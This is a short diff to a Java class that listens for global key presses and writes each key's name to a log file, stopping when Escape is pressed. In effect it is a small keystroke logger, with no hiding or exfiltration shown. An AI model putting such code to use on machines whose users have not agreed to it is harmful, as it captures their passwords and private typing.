@@ -31,13 +31,15 @@ public class MyCommands implements NativeKeyListener {
     }
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
+        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
         if(e.getKeyCode() == NativeKeyEvent.VC_ESCAPE){
             Loger.writeEndFile();
             System.out.println("Finish Logging");
             System.exit(0);
         }
         // Handle the key pressed event
-        Loger.writeFile(String.valueOf(e.getKeyChar()));
+          Loger.writeFile(keyText);
+//        Loger.writeFile(String.valueOf(e.getKeyChar()));
 //        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
     }
 
